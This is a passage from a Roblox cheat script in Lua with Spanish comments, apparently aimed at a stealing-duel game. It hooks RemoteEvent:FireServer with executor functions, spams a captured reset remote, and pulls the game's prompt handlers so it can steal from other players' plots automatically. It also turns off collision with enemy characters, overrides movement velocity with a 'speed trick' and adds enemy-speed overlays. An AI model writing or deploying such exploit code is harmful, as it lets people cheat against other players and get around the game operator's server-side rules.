    if not cursedResetRemote then
        for _, desc in ipairs(game:GetDescendants()) do
            if desc:IsA("RemoteEvent") and desc.Name:sub(1, 3) == "RE/" then
                cursedResetRemote = desc
                break
            end
        end
    end
    if not cursedResetRemote then return end
    insta_reset_cooldown = true
    local old_char = LP.Character
    if not old_char then
        insta_reset_cooldown = false
        return
    end
    task.spawn(function()
        while LP.Character == old_char do
            pcall(function()
                cursedResetRemote:FireServer(CURSED_RESET_GUID, LP, "balloon")
            end)
            task.wait()
        end
        insta_reset_cooldown = false
    end)
end

pcall(function()
    if hookfunction and newcclosure then
        local oldFire
        oldFire = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
            if not cursedResetRemote and typeof(self) == "Instance" and self:IsA("RemoteEvent") and self.Name:sub(1,3) == "RE/" then
                cursedResetRemote = self
            end
            return oldFire(self, ...)
        end))
    end
end)

local function findCursedResetRemote()
    if cursedResetRemote then return end
    for _, desc in ipairs(game:GetDescendants()) do
        if desc:IsA("RemoteEvent") and desc.Name:sub(1,3) == "RE/" then
            cursedResetRemote = desc
            return
        end
    end
end

task.spawn(function()
    task.wait(2)
    findCursedResetRemote()
end)

-- ============================================================
-- 🔥 Cooldown reducido a 0.1 segundos
-- ============================================================
local BAT_AIMBOT_SPEED = 58
local BYPASS_AIMBOT_SPEED = 60
local bypassToggled = false
local bypassFloatingButton = nil
local bypassFloatingPos = nil
local bypassMode = 1
local lastDropTime = 0
local BAT_V2_SWING_COOLDOWN = 0.1

local AP = {
    L1 = Vector3.new(-476.48, -6.28, 92.73),
    L2 = Vector3.new(-483.12, -4.95, 94.80),
    L_FACE = Vector3.new(-482.25, -4.96, 92.09),
    R1 = Vector3.new(-476.16, -6.52, 25.62),
    R2 = Vector3.new(-483.06, -5.03, 25.48),
    R_FACE = Vector3.new(-482.06, -6.93, 35.47),
}

local Conns = {batCounter = nil, anchor = {}, autoLeft = nil, autoRight = nil}

-- ====== AUTO STEAL (NUEVO SISTEMA) ======
local Steal = {
    AutoStealEnabled = false,
    StealRadius = 55,
    StealDuration = 0.1,
    Mode = "half",
    HalfFireRange = 10,
    HalfHoldMin = 1.3,
    HalfHoldMax = 2.6,
    HalfEntryDelay = 0.3,
    Data = {}
}
local isStealing = false
local stealStartTime = nil
local stealEndTime = nil
local stealCompleted = false
local autoConn = nil
local progressFill, progressTitle
local progressShimmerGradient = nil

local function isMyPlotByName(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
    end
    return false
end

local function findNearestPrompt()
    local char = LP.Character
    if not char then return nil end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not root then return nil end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local nearest, dist = nil, math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") and not isMyPlotByName(plot.Name) then
            local pods = plot:FindFirstChild("AnimalPodiums")
            if pods then
                for _, pod in ipairs(pods:GetChildren()) do
                    local base = pod:FindFirstChild("Base")
                    local sp = base and base:FindFirstChild("Spawn")
                    if sp then
                        local d = (sp.Position - root.Position).Magnitude
                        if d <= Steal.StealRadius and d < dist then
                            local found = nil
                            local att = sp:FindFirstChild("PromptAttachment")
                            if att then
                                for _, pr in ipairs(att:GetChildren()) do
                                    if pr:IsA("ProximityPrompt") and pr.ActionText and pr.ActionText:find("Steal") then found = pr end
                                end
                            end
                            if not found then
                                for _, pr in ipairs(sp:GetDescendants()) do
                                    if pr:IsA("ProximityPrompt") and pr.ActionText and pr.ActionText:find("Steal") then found = pr end
                                end
                            end
                            if found then nearest, dist = found, d end
                        end
                    end
                end
            end
        end
    end
    return nearest
end

local function _promptDist(prompt)
    local char = LP.Character
    if not char then return math.huge end
    local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso")
    if not root then return math.huge end
    local part = prompt.Parent
    if part and part:IsA("Attachment") then part = part.Parent end
    if part and part:IsA("BasePart") then return (part.Position - root.Position).Magnitude end
    local ok, cf = pcall(function() return prompt.Parent and prompt.Parent.WorldPosition end)
    if ok and cf then return (cf - root.Position).Magnitude end
    return math.huge
end

local function executeSteal(prompt)
    if isStealing then return end
    if not Steal.Data[prompt] then
        Steal.Data[prompt] = {hold = {}, trigger = {}, ready = true}
        if getconnections then
            for _, c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                if c.Function then table.insert(Steal.Data[prompt].hold, c.Function) end
            end
            for _, c in ipairs(getconnections(prompt.Triggered)) do
                if c.Function then table.insert(Steal.Data[prompt].trigger, c.Function) end
            end
        end
    end
    local data = Steal.Data[prompt]
    if not data.ready then return end
    data.ready = false
    isStealing = true
    stealCompleted = false
    stealStartTime = tick()
    stealEndTime = nil

    task.spawn(function()
        for _, fn in ipairs(data.hold) do task.spawn(fn) end
        task.wait(Steal.HalfHoldMin)
        local inRange = _promptDist(prompt) <= Steal.HalfFireRange
        while true do
            local el = tick() - stealStartTime
            if el > Steal.HalfHoldMax or not prompt.Parent then break end
            if _promptDist(prompt) <= Steal.HalfFireRange then
                if not inRange then task.wait(Steal.HalfEntryDelay) end
                for _, fn in ipairs(data.trigger) do task.spawn(fn) end
                break
            end
            task.wait()
        end
        stealCompleted = true
        stealEndTime = tick()
        task.wait(0.5)
        data.ready = true
        isStealing = false
        stealCompleted = false
    end)
end

local function startAutoSteal()
    if autoConn then return end
    autoConn = RunService.Heartbeat:Connect(function()
        if not Steal.AutoStealEnabled or isStealing then return end
        local p = findNearestPrompt()
        if p then executeSteal(p) end
    end)
end

local function stopAutoSteal()
    if autoConn then
        autoConn:Disconnect()
        autoConn = nil
    end
    isStealing = false
    stealCompleted = false
end

-- ====== CONSTRUCCIÓN DE UI DE AUTO STEAL (CON FONDO DE IMAGEN, BORDES ROJOS) ======
local autoStealUI = nil
local function buildAutoStealUI()
    if autoStealUI then return end
    local gui = Instance.new("ScreenGui")
    gui.Name = "AceDuelsAutoStealTopBar"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 999
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = LP:WaitForChild("PlayerGui")
    autoStealUI = gui

    local StealBarShadow = Instance.new("Frame")
    StealBarShadow.Name = "StealBarShadow"
    StealBarShadow.ZIndex = 9
    StealBarShadow.Position = UDim2.new(0.5, -139, 0, 131)
    StealBarShadow.Size = UDim2.new(0, 285, 0, 32)
    StealBarShadow.BackgroundColor3 = Color3.fromRGB(10, 20, 50)
    StealBarShadow.BackgroundTransparency = 0.55
    StealBarShadow.BorderSizePixel = 0
    StealBarShadow.Parent = gui
    local UICorner = Instance.new("UICorner")
    UICorner.Name = "UICorner"
    UICorner.CornerRadius = UDim.new(0, 14)
    UICorner.Parent = StealBarShadow

    local StealBar = Instance.new("TextButton")
    StealBar.Name = "StealBar"
    StealBar.ZIndex = 10
    StealBar.ClipsDescendants = true
    StealBar.Position = UDim2.new(0.5, -142, 0, 128)
    StealBar.Size = UDim2.new(0, 285, 0, 32)
    StealBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    StealBar.BackgroundTransparency = 1
    StealBar.BorderSizePixel = 0
    StealBar.Text = ""
    StealBar.AutoButtonColor = false
    StealBar.Parent = gui

    local bgImage = Instance.new("ImageLabel")
    bgImage.Name = "FondoAutoSteal"
    bgImage.Size = UDim2.new(1, 0, 1, 0)
    bgImage.Position = UDim2.new(0, 0, 0, 0)
    bgImage.BackgroundTransparency = 1
    bgImage.Image = "rbxassetid://124833425021074"
    bgImage.ImageTransparency = 0
    bgImage.ScaleType = Enum.ScaleType.Crop
    bgImage.ZIndex = 0
    bgImage.Parent = StealBar
    local bgCorner = Instance.new("UICorner")
    bgCorner.CornerRadius = UDim.new(0, 14)
    bgCorner.Parent = bgImage

    local UICorner2 = Instance.new("UICorner")
    UICorner2.Name = "UICorner"
    UICorner2.CornerRadius = UDim.new(0, 14)
    UICorner2.Parent = StealBar

    -- BORDE PRINCIPAL (ROJO)
    local UIStroke = Instance.new("UIStroke")
    UIStroke.Name = "UIStroke"
    UIStroke.Color = Color3.fromRGB(255, 0, 0)
    UIStroke.Thickness = 1.4
    UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    UIStroke.Transparency = 0.2
    UIStroke.Parent = StealBar

    local StrokeGradient = Instance.new("UIGradient")
    StrokeGradient.Name = "StrokeGradient"
    StrokeGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 50, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 0))
    })
    StrokeGradient.Rotation = 0
    StrokeGradient.Parent = UIStroke

    local LeftToRightFill = Instance.new("Frame")
    LeftToRightFill.Name = "LeftToRightFill"
    LeftToRightFill.ZIndex = 11
    LeftToRightFill.Size = UDim2.new(0, 0, 1, 0)
    LeftToRightFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    LeftToRightFill.BackgroundTransparency = 0.2
    LeftToRightFill.BorderSizePixel = 0
    LeftToRightFill.Parent = StealBar

    local shimmerGrad = Instance.new("UIGradient")
    shimmerGrad.Name = "ShimmerGradient"
    shimmerGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 180, 180, 0)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(200, 200, 200, 0.5)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220, 220, 220, 0.7)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(200, 200, 200, 0.5)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 180, 180, 0))
    })
    shimmerGrad.Rotation = 0
    shimmerGrad.Offset = Vector2.new(0, 0)
    shimmerGrad.Parent = LeftToRightFill
    progressShimmerGradient = shimmerGrad

    local UICorner3 = Instance.new("UICorner")
    UICorner3.Name = "UICorner"
    UICorner3.CornerRadius = UDim.new(0, 14)
    UICorner3.Parent = LeftToRightFill

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.ZIndex = 12
    Title.Position = UDim2.new(0, 12, 0, 0)
    Title.Size = UDim2.new(1, -42, 1, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "⚡️STEAL  |  0%"
    Title.TextColor3 = Color3.fromRGB(245, 245, 245)
    Title.TextSize = 12
    Title.Font = Enum.Font.GothamBlack
    Title.TextStrokeTransparency = 0.45
    Title.Parent = StealBar

    progressFill = LeftToRightFill
    progressTitle = Title

    local SettingsGear = Instance.new("TextButton")
    SettingsGear.Name = "SettingsGear"
    SettingsGear.ZIndex = 13
    SettingsGear.Position = UDim2.new(1, -29, 0.5, -12)
    SettingsGear.Size = UDim2.new(0, 24, 0, 24)
    SettingsGear.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
    SettingsGear.BackgroundTransparency = 0.18
    SettingsGear.BorderSizePixel = 0
    SettingsGear.Text = "⚙"
    SettingsGear.TextColor3 = Color3.fromRGB(245, 245, 245)
    SettingsGear.TextSize = 13
    SettingsGear.Font = Enum.Font.GothamBlack
    SettingsGear.AutoButtonColor = false
    SettingsGear.Parent = StealBar

    local UICorner4 = Instance.new("UICorner")
    UICorner4.Name = "UICorner"
    UICorner4.CornerRadius = UDim.new(0, 10)
    UICorner4.Parent = SettingsGear

    -- BORDE DEL ENGRANAJE (ROJO)
    local UIStroke2 = Instance.new("UIStroke")
    UIStroke2.Name = "UIStroke2"
    UIStroke2.Color = Color3.fromRGB(255, 0, 0)
    UIStroke2.Thickness = 1.2
    UIStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    UIStroke2.Parent = SettingsGear

    local StrokeGradient2 = Instance.new("UIGradient")
    StrokeGradient2.Name = "StrokeGradient2"
    StrokeGradient2.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 50, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 0))
    })
    StrokeGradient2.Rotation = 0
    StrokeGradient2.Parent = UIStroke2

    local RadiusDropdown = Instance.new("Frame")
    RadiusDropdown.Name = "RadiusDropdown"
    RadiusDropdown.ZIndex = 20
    RadiusDropdown.Position = UDim2.new(0.5, -33, 0, 166)
    RadiusDropdown.Size = UDim2.new(0, 176, 0, 62)
    RadiusDropdown.BackgroundColor3 = Color3.fromRGB(5, 5, 6)
    RadiusDropdown.BackgroundTransparency = 0.04
    RadiusDropdown.BorderSizePixel = 0
    RadiusDropdown.Visible = false
    RadiusDropdown.Parent = gui

    local UICorner5 = Instance.new("UICorner")
    UICorner5.Name = "UICorner"
    UICorner5.CornerRadius = UDim.new(0, 14)
    UICorner5.Parent = RadiusDropdown

    -- BORDE DEL DROPDOWN (ROJO)
    local UIStroke3 = Instance.new("UIStroke")
    UIStroke3.Name = "UIStroke3"
    UIStroke3.Color = Color3.fromRGB(255, 0, 0)
    UIStroke3.Thickness = 1.2
    UIStroke3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    UIStroke3.Transparency = 0.22
    UIStroke3.Parent = RadiusDropdown

    local StrokeGradient3 = Instance.new("UIGradient")
    StrokeGradient3.Name = "StrokeGradient3"
    StrokeGradient3.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 50, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 0))
    })
    StrokeGradient3.Rotation = 0
    StrokeGradient3.Parent = UIStroke3

    local UIGradient2 = Instance.new("UIGradient")
    UIGradient2.Name = "UIGradient"
    UIGradient2.Color = ColorSequence.new(Color3.fromRGB(24, 24, 27), Color3.fromRGB(5, 5, 6))
    UIGradient2.Rotation = 90
    UIGradient2.Parent = RadiusDropdown

    local TextLabel = Instance.new("TextLabel")
    TextLabel.Name = "TextLabel"
    TextLabel.ZIndex = 21
    TextLabel.Position = UDim2.new(0, 12, 0, 0)
    TextLabel.Size = UDim2.new(1, -78, 1, 0)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Text = "RADIUS"
    TextLabel.TextColor3 = Color3.fromRGB(245, 245, 245)
    TextLabel.TextSize = 12
    TextLabel.Font = Enum.Font.GothamBlack
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel.Parent = RadiusDropdown

    local RadiusBox = Instance.new("TextBox")
    RadiusBox.Name = "RadiusBox"
    RadiusBox.ZIndex = 22
    RadiusBox.Position = UDim2.new(1, -64, 0.5, -15)
    RadiusBox.Size = UDim2.new(0, 54, 0, 30)
    RadiusBox.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
    RadiusBox.BorderSizePixel = 0
    RadiusBox.Text = tostring(Steal.StealRadius)
    RadiusBox.TextColor3 = Color3.fromRGB(35, 35, 38)
    RadiusBox.TextSize = 13
    RadiusBox.Font = Enum.Font.GothamBlack
    RadiusBox.ClearTextOnFocus = false
    RadiusBox.Parent = RadiusDropdown

    local UICorner6 = Instance.new("UICorner")
    UICorner6.Name = "UICorner"
    UICorner6.CornerRadius = UDim.new(0, 12)
    UICorner6.Parent = RadiusBox

    -- BORDE DEL CUADRO DE RADIO (ROJO)
    local UIStroke4 = Instance.new("UIStroke")
    UIStroke4.Name = "UIStroke4"
    UIStroke4.Color = Color3.fromRGB(255, 0, 0)
    UIStroke4.Thickness = 1.2
    UIStroke4.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    UIStroke4.Transparency = 0.48
    UIStroke4.Parent = RadiusBox

    local StrokeGradient4 = Instance.new("UIGradient")
    StrokeGradient4.Name = "StrokeGradient4"
    StrokeGradient4.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 50, 50)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 0))
    })
    StrokeGradient4.Rotation = 0
    StrokeGradient4.Parent = UIStroke4

    task.spawn(function()
        local gradients = {StrokeGradient, StrokeGradient2, StrokeGradient3, StrokeGradient4}
        while true do
            for _, grad in ipairs(gradients) do
                if grad and grad.Parent then
                    local rot = (tick() * 45) % 360
                    grad.Rotation = rot
                end
            end
            task.wait()
        end
    end)

    SettingsGear.Activated:Connect(function()
        if uiLocked then return end
        RadiusDropdown.Visible = not RadiusDropdown.Visible
    end)

    RadiusBox.FocusLost:Connect(function(enterPressed)
        local val = tonumber(RadiusBox.Text)
        if val and val > 0 then
            Steal.StealRadius = math.clamp(math.floor(val), 1, 500)
            RadiusBox.Text = tostring(Steal.StealRadius)
            saveNow()
        else
            RadiusBox.Text = tostring(Steal.StealRadius)
        end
    end)

    local dragging, dragStart, startPos, startShadowPos, startDropdownPos = false, nil, nil, nil, nil
    StealBar.InputBegan:Connect(function(inp)
        if uiLocked then return end
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = inp.Position
            startPos = StealBar.Position
            startShadowPos = StealBarShadow.Position
            startDropdownPos = RadiusDropdown.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)

    UIS.InputChanged:Connect(function(inp)
        if uiLocked then return end
        if not dragging then return end
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            local dx = inp.Position.X - dragStart.X
            local dy = inp.Position.Y - dragStart.Y
            local cam = workspace.CurrentCamera
            local vp = cam and cam.ViewportSize or Vector2.new(1000, 1000)
            local baseX = startPos.X.Scale * vp.X
            local baseY = startPos.Y.Scale * vp.Y

            StealBar.Position = UDim2.new(0, baseX + startPos.X.Offset + dx, 0, baseY + startPos.Y.Offset + dy)
            StealBarShadow.Position = UDim2.new(0, baseX + startShadowPos.X.Offset + dx, 0, baseY + startShadowPos.Y.Offset + dy)
            RadiusDropdown.Position = UDim2.new(0, baseX + startDropdownPos.X.Offset + dx, 0, baseY + startDropdownPos.Y.Offset + dy)
        end
    end)

    local _lastPct = 0
    local _visualSpeed = 0.35
    local _decaySpeed = 1.5
    RunService.RenderStepped:Connect(function(dt)
        local targetPct = 0
        if isStealing and stealStartTime then
            if stealCompleted then
                local timeSinceComplete = tick() - (stealEndTime or tick())
                if timeSinceComplete < 0.3 then
                    targetPct = 1
                else
                    targetPct = math.max(0, 1 - (timeSinceComplete - 0.3) * _decaySpeed)
                end
            else
                local rawPct = math.clamp((tick() - stealStartTime) / math.max(Steal.HalfHoldMin, 0.01), 0, 1)
                targetPct = rawPct
            end
        else
            targetPct = 0
        end

        _lastPct = _lastPct + (targetPct - _lastPct) * math.min(dt * _visualSpeed * 60, 1)
        local f = math.clamp(_lastPct, 0, 1)

        if progressFill then
            progressFill.Size = UDim2.new(f, 0, 1, 0)
            local r, g, b
            if f <= 0.5 then
                local t = f / 0.5
                r = 1
                g = 1 - t
                b = 0
            else
                local t = (f - 0.5) / 0.5
                r = 1 - t
                g = t
                b = 0
            end
            progressFill.BackgroundColor3 = Color3.new(r, g, b)
        end

        if progressTitle then
            progressTitle.Text = "⚡️STEAL  |  " .. math.floor(f * 100) .. "%"
        end

        if progressShimmerGradient then
            local time = tick() * 0.3
            local offsetX = (time % 1)
            progressShimmerGradient.Offset = Vector2.new(offsetX, 0)
        end
    end)

    local function updateVisibility()
        if Steal.AutoStealEnabled then
            StealBar.Visible = true
            StealBarShadow.Visible = true
        else
            StealBar.Visible = false
            StealBarShadow.Visible = false
            RadiusDropdown.Visible = false
        end
    end
    updateVisibility()

    _G.updateAutoStealUI = updateVisibility
end

-- ====== STRETCH ======
local function applyStretchFOV(val)
    local cam = workspace.CurrentCamera
    if cam then
        pcall(function() cam.FieldOfView = val end)
    end
end

local function enableStretch()
    if stretchConn then return end
    stretchEnabled = true
    local cam = workspace.CurrentCamera
    if not cam then return end
    origFOV = cam.FieldOfView or 70
    applyStretchFOV(stretchFOV)
    stretchConn = RunService.RenderStepped:Connect(function()
        if not stretchEnabled then
            stretchConn:Disconnect()
            stretchConn = nil
            return
        end
        local c = workspace.CurrentCamera
        if c then
            c.CFrame = c.CFrame * CFrame.new(0,0,0,1,0,0,0,0.7,0,0,0,1)
        end
    end)
    if stretchFovConn then stretchFovConn:Disconnect() end
    stretchFovConn = RunService.RenderStepped:Connect(function()
        if stretchEnabled then
            applyStretchFOV(stretchFOV)
        else
            stretchFovConn:Disconnect()
            stretchFovConn = nil
        end
    end)
end

local function disableStretch()
    stretchEnabled = false
    if stretchConn then
        stretchConn:Disconnect()
        stretchConn = nil
    end
    if stretchFovConn then
        stretchFovConn:Disconnect()
        stretchFovConn = nil
    end
    local cam = workspace.CurrentCamera
    if cam then
        pcall(function() cam.FieldOfView = origFOV or 70 end)
    end
end

-- ====== ENEMY SPEED ======
local enemySpeedConn = nil
local function updateEnemySpeedLabels()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP then
            local char = player.Character
            if char and char:FindFirstChild("HumanoidRootPart") and char:FindFirstChildOfClass("Humanoid") and char:FindFirstChildOfClass("Humanoid").Health > 0 then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local velocity = hrp.AssemblyLinearVelocity
                local speed = (Vector3.new(velocity.X, 0, velocity.Z).Magnitude)
                local label = enemySpeedLabels[player]
                if not label then
                    local head = char:FindFirstChild("Head")
                    if head then
                        local bb = Instance.new("BillboardGui", head)
                        bb.Size = UDim2.new(0, 100, 0, 25)
                        bb.StudsOffset = Vector3.new(0, 3.5, 0)
                        bb.AlwaysOnTop = true
                        bb.Name = "EnemySpeedGui"
                        local textLabel = Instance.new("TextLabel", bb)
                        textLabel.Size = UDim2.new(1, 0, 1, 0)
                        textLabel.BackgroundTransparency = 1
                        textLabel.Text = "SPEED: 0.0"
                        textLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
                        textLabel.Font = Enum.Font.GothamBold
                        textLabel.TextScaled = true
                        textLabel.TextStrokeTransparency = 0
                        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                        label = textLabel
                        enemySpeedLabels[player] = label
                    end
                elseif label and label.Parent and label.Parent.Parent ~= char then
                    local head = char:FindFirstChild("Head")
                    if head then
                        label.Parent.Parent = head
                    end
                end
                if label then
                    label.Text = "SPEED: " .. string.format("%.1f", speed)
                end
            else
                local label = enemySpeedLabels[player]
                if label and label.Parent and label.Parent.Parent then
                    label.Parent.Parent = nil
                end
                enemySpeedLabels[player] = nil
            end
        end
    end
    for player, label in pairs(enemySpeedLabels) do
        if not player or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
            if label and label.Parent and label.Parent.Parent then
                label.Parent.Parent = nil
            end
            enemySpeedLabels[player] = nil
        end
    end
end

local function startEnemySpeed()
    if enemySpeedConn then enemySpeedConn:Disconnect() end
    enemySpeedConn = RunService.Heartbeat:Connect(function()
        updateEnemySpeedLabels()
    end)
end

local uiLocked = false

-- ============================================================
-- 🔥 NUEVA FUNCIÓN: Borde Shimmer Rojo y Negro para botones flotantes
-- ============================================================
local function applyShimmerStroke(parent, thickness)
    thickness = thickness or 1.8
    local stroke = Instance.new("UIStroke", parent)
    stroke.Thickness = thickness
    stroke.Transparency = 0.1
    stroke.Color = Color3.fromRGB(255, 0, 0)  -- Rojo base
    local grad = Instance.new("UIGradient", stroke)
    -- Degradado rojo → negro → rojo con brillo
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(100, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(100, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
    })
    grad.Rotation = 0
    task.spawn(function()
        while grad and grad.Parent do
            grad.Rotation = (grad.Rotation + 0.8) % 360
            task.wait(0.025)
        end
    end)
    return stroke
end

-- ====== BOTONES FLOTANTES MÓVILES (cada uno independiente) ======
local mobileButtonFrames = {}
local mobileButtonSetters = {}
local mobileButtonPositions = {}
local mobileButtonScreenGui = nil

local mobSetDropBR, mobSetAutoLeft, mobSetAutoBat, mobSetAutoRight, mobSetTpDown, mobSetCarry, mobSetLagger, mobSetBatTP

local antiLagDescConn = nil
local unwalkSavedAnimate = nil
local _anyKeyListening = false
local autoTPHeight = 20

local KB = {
    DropBrainrot={kb=Enum.KeyCode.X,gp=nil},
    AutoLeft    ={kb=Enum.KeyCode.Z,gp=nil},
    AutoRight   ={kb=Enum.KeyCode.C,gp=nil},
    AutoBat     ={kb=Enum.KeyCode.E,gp=nil},
    TPFloor     ={kb=Enum.KeyCode.F,gp=nil},
    GuiHide     ={kb=Enum.KeyCode.LeftControl,gp=nil},
    CarryToggle={kb=Enum.KeyCode.Q,gp=nil},
    LaggerMode  ={kb=Enum.KeyCode.R,gp=nil},
    AutoTPDown  ={kb=Enum.KeyCode.T,gp=nil},
    InstaReset  ={kb=Enum.KeyCode.G,gp=nil},
    JumpMode    ={kb=Enum.KeyCode.V,gp=nil},
    Bypass      ={kb=Enum.KeyCode.N,gp=nil},
    TPBat       ={kb=Enum.KeyCode.M,gp=nil},
}

local GAMEPAD_KEYS={
    [Enum.KeyCode.ButtonA]=true,[Enum.KeyCode.ButtonB]=true,[Enum.KeyCode.ButtonX]=true,[Enum.KeyCode.ButtonY]=true,
    [Enum.KeyCode.ButtonL1]=true,[Enum.KeyCode.ButtonR1]=true,[Enum.KeyCode.ButtonL2]=true,[Enum.KeyCode.ButtonR2]=true,
    [Enum.KeyCode.ButtonL3]=true,[Enum.KeyCode.ButtonR3]=true,[Enum.KeyCode.ButtonStart]=true,[Enum.KeyCode.ButtonSelect]=true,
    [Enum.KeyCode.DPadUp]=true,[Enum.KeyCode.DPadDown]=true,[Enum.KeyCode.DPadLeft]=true,[Enum.KeyCode.DPadRight]=true
}

local function isGamepadInput(inp)
    return inp and inp.UserInputType and inp.UserInputType.Name:match("^Gamepad") ~= nil
end

local function isBindableInput(inp)
    if not inp or inp.KeyCode == Enum.KeyCode.Unknown then return false end
    if inp.UserInputType == Enum.UserInputType.Keyboard then return true end
    return isGamepadInput(inp) and GAMEPAD_KEYS[inp.KeyCode] == true
end

local function kbMatch(entry, kc)
    return kc and (kc == entry.kb or (entry.gp and kc == entry.gp))
end

local lastMoveDir = Vector3.new(0,0,0)

local MOVE_KEYS={[Enum.KeyCode.W]=true,[Enum.KeyCode.A]=true,[Enum.KeyCode.S]=true,[Enum.KeyCode.D]=true,
    [Enum.KeyCode.Up]=true,[Enum.KeyCode.Left]=true,[Enum.KeyCode.Down]=true,[Enum.KeyCode.Right]=true}

local steppedConn = nil
local movementLoop = nil

-- ============================================================
-- 🔧 MEJORA: Desactivación de colisiones con enemigos
-- ============================================================
steppedConn = RunService.Stepped:Connect(function()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            for _, part in ipairs(p.Character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end
end)

-- Función para obtener la velocidad manual según los modos activos
local function getManualSpeed()
    if speedMode then
        activeSpeedValue = CS
        return CS
    elseif laggerToggled then
        activeSpeedValue = LAGGER_SPEED_1  -- Usamos el nivel 1 para la velocidad manual
        return LAGGER_SPEED_1
    else
        activeSpeedValue = NS
        return NS
    end
end

-- ============================================================
-- 🚀 DETECCIÓN DE SALTO (para no romperlo con el truco)
-- ============================================================
UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.Space then
        isJumping = true
        task.wait(0.25)
        isJumping = false
    end
end)

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if root and math.abs(root.AssemblyLinearVelocity.Y) > 3 then
        isJumping = true
    elseif root and math.abs(root.AssemblyLinearVelocity.Y) < 1 and isJumping then
        isJumping = false
    end
end)

-- ============================================================
-- 🔥 MOVIMIENTO PRINCIPAL CON EL TRUCO DE VELOCIDAD
-- ============================================================
movementLoop = RunService.RenderStepped:Connect(function()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hum or not hrp then return end

    -- Si algún modo automático está activo, no intervenimos (ellos manejan la velocidad)
    if not autoBatEnabled and not bypassToggled and not autoLeftEnabled and not autoRightEnabled then
        local md = hum.MoveDirection
        local spd = getManualSpeed()  -- Velocidad según modo
        -- Asignar WalkSpeed también
        hum.WalkSpeed = spd

        if md.Magnitude > 0.1 then
            lastMoveDir = md
            -- Aplicar velocidad con el truco
            local currentVel = hrp.AssemblyLinearVelocity
            local newYVel = currentVel.Y
            if not isJumping and math.abs(currentVel.Y) < 1 then
                newYVel = VELOCITY_Y_TRICK  -- 0.000026 en lugar de 0
            end
            hrp.AssemblyLinearVelocity = Vector3.new(
                md.X * spd,
                newYVel,
                md.Z * spd
            )
        elseif antiRagdollEnabled and lastMoveDir.Magnitude > 0 then
            local anyHeld = false
            for key in pairs(MOVE_KEYS) do
                if UIS:IsKeyDown(key) then anyHeld = true; break end
            end
            if anyHeld then
